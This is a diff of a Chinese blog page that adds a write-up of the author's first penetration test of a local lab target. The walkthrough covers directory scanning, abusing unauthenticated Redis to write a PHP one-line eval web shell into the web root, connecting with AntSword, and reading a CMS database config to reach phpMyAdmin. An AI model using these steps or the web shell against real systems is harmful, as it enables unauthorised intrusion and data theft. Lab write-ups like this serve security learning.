@@ -114,27 +114,44 @@
   data-scroll-reveal
 >
   <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2023/03/15/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/"
-    >第一次内网靶场渗透测试</a> 
-</h2>
- 
-
-      
-    </header>
      
     <div class="article-meta">
       <a href="/2023/03/15/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/" class="article-date">
-  <time datetime="2023-03-15T12:47:36.000Z" itemprop="datePublished">2023-03-15</time>
+  <time datetime="2023-03-15T12:47:36.072Z" itemprop="datePublished">2023-03-15</time>
 </a>    
     </div>
       
     <div class="article-entry" itemprop="articleBody">
        
-   
+  <hr>
+<p>title：第一次内网靶场渗透<br>data：2023.03.16 20：00：00<br>tage：’’</p>
+<hr>
+<p>第一次接触到内网这一块，刚好最近新搭了博客。</p>
+<p>因为是在本地开的虚拟机，所以通过扫自己的c段找到网站。</p>
+<p>用dirsearch扫一下看看，可以发现几个有用的目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin      </span><br><span class="line">/flag.php           </span><br><span class="line">/.gitignore</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;.gitignore可以得到第一个flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303161209848.png" alt="image-20230316120950795"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303161210471.png" alt="image-20230316121012442"></p>
+<p>看见一个会员登入的地方和要会员才可以看见的flag，但是这里因为靶场的问题，验证码显示不出来，不能用弱口令登入，不过这是一个windows7的靶机，可以用端口的漏洞getshell。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171207678.png" alt="image-20230317120704068"></p>
+<p>nmap扫出来很多端口，这里用的是6379的redis未授权，这里没有扫出来</p>
+<p>先redis-cli -h url -p 6379</p>
+<p>然后config set dir C:&#x2F;phpstudy_pro&#x2F;WWW设置路径，路径地址可以从之前dirsearch扫出来的一个flag.php爆出的错得到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171228108.png" alt="image-20230317122813085"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dbfilename hack.php设置文件名</span><br><span class="line"></span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;&quot;写入一句话</span><br><span class="line"></span><br><span class="line">最后save保存</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171213245.png" alt="image-20230317121337225"></p>
+<p>就可以用蚁剑成功连接了</p>
+<p>可以看见第三个flag<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171218017.png" alt="image-20230317121833994"></p>
+<p>之前在网站上看见一个要会员登入才可以查看的flag<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171220259.png" alt="image-20230317122008233"></p>
+<p>一个flag需要getshell，一个需要弱口令登入，剩下两个就是数据库和提权了</p>
+<p>因为是dedecms搭的靶场，所以百度下很快可以找到数据库配置文件位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171226349.png" alt="image-20230317122622318"></p>
+<p>到之前扫到的phpmyadmin直接登入，可以找到第四个flag<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171231932.png" alt="image-20230317123138894"></p>
+<p>第五个flag本来是要提权才可以得到，但是因为靶场的原因，getshell完就是root，所以找到在哪里就可以直接看见<img src="https://cdn.jsdelivr.net/gh/x1n-yan/myblog/main/img/202303171233492.png" alt="image-20230317123359471"></p>
+ 
       <!-- reward -->
       
     </div>
